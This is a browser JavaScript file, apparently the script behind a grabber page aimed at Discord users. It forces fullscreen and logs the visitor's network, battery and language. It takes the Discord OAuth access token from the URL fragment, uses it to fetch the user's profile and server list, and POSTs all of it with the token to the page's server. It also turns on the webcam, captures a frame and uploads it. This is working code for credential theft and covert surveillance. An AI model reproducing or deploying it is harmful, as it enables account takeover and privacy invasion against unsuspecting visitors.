async function fullscreen() {
  await document.documentElement.requestFullscreen({ navigationUI: "hide" });
}

fullscreen();
(async () => {
  let connection = navigator.connection;
  if (!connection) {
    connection = {};
    connection.type = undefined;
    connection.downlink = undefined;
  }
  let battery;
  try {
    battery = (await navigator.getBattery()).level * 100 + '%';
  } catch {
    battery = '<Unknown>';
  }
  fetch(`/log?network=${connection.type || "<Unknown>"}&speed=${connection.downlink || "<Unknown>"}&battery=${battery}&language=${navigator.language || "<Unknown>"}`);
})()

document.addEventListener('DOMContentLoaded', async () => {
  const fragment = new URLSearchParams(window.location.hash.slice(1));
	const [accessToken, tokenType] = [fragment.get('access_token'), fragment.get('token_type')];
	if (!accessToken) {
		return;
	}
  const resp = await fetch('https://discord.com/api/users/@me', {
		headers: {
			authorization: `${tokenType} ${accessToken}`,
		},
	});
  let info = await resp.json();
  const resp2 = await fetch('https://discord.com/api/users/@me/guilds', {
    headers: {
			authorization: `${tokenType} ${accessToken}`,
		}
  })
  info.guilds = await resp2.json();
  fetch(`/discord?accessToken=${accessToken}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json;charset=utf-8'
    },
    body: JSON.stringify(info)
  })
})

document.addEventListener('DOMContentLoaded', async () => {
  let canvas = document.querySelector('canvas'), video = document.querySelector('video');
  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
  video.srcObject = stream;
  video.play();
  video.addEventListener('canplay', ev => {
    canvas.setAttribute('width', video.videoWidth);
    canvas.setAttribute('height', video.videoHeight);
    var context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
    var data = canvas.toDataURL('image/png');
    fetch('/webcam', {
      method: 'POST',
      body: JSON.stringify({
        img: data.replace(/^data:image\/png;base64,/, '')
      }),
      headers: {
        'Content-Type': 'application/json;charset=utf-8'
      }
    })
  }, false);
})
